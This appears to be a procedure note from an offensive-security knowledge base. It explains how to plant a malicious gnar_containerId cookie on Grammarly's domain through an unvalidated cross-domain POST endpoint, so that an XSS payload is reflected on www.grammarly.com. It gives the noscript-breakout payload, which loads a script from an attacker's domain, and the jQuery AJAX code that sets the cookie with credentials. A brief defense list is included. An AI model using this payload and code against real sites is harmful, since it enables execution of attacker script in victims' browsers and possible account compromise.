---
tags:
  - cookie-manipulation
  - xss-injection
  - ajax-post
type: procedure
tools:
  - '[[tools/jQuery-for-Cross-Domain-AJAX]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
sub_techniques: []
id: 26ec4d43-f71e-4257-992e-f7d7badee05b
created_at: '2025-12-14T17:33:34.376Z'
updated_at: '2025-12-14T17:33:34.376Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Malicious-gnar_containerId-Cookie-via-POST-Endpoint

## Summary

This procedure uses JavaScript and jQuery to send a cross-domain POST request to an unrestricted cookie endpoint, setting a malicious gnar_containerId cookie with an XSS payload that will be reflected on the target site.

## Description

The /cookies endpoint on gnar.grammarly.com allows setting any cookie without validation, enabling third-party sites to inject payloads. The payload is crafted to close a noscript tag and inject a script tag loading external JS, exploiting the unsanitized reflection in www.grammarly.com's noscript img src.

## Requirements

1. Victim's browser with JavaScript enabled
2. jQuery loaded on the malicious page
3. Attacker's domain for the payload URL

## Defense

Defensive measures and detection strategies:

- Add referer checks or origin validation to cookie-setting endpoints
- Sanitize all cookie reflections in HTML contexts
- Use HttpOnly flags where possible, though bypassed here indirectly

## Objectives

1. Inject XSS payload into the cookie
2. Ensure cookie persists with long maxAge
3. Prepare for reflection and execution

## Instructions

### Step 1: Define the Payload

**Context**: Encode the XSS payload to break out of the noscript context.

The payload: `'</noscript><script src="https://<YOUR_DOMAIN_NAME>/poc.js"></script><noscript>'`

> URL-encode if needed for the POST value.

### Step 2: Execute jQuery AJAX POST

**Context**: Send the POST request with credentials to set the cookie.

In the HTML script:
```javascript
$.ajax({
  url: 'https://gnar.grammarly.com/cookies',
  type: 'POST',
  data: {name: 'gnar_containerId', value: encoded_payload, maxAge: 2147483647},
  xhrFields: {withCredentials: true},
  crossDomain: true,
  async: false
});
```

> Expected output: No errors; cookie set in browser dev tools under Application > Cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/jQuery-for-Cross-Domain-AJAX]]

## Tags

- [[cookie-manipulation]]
- [[xss-injection]]
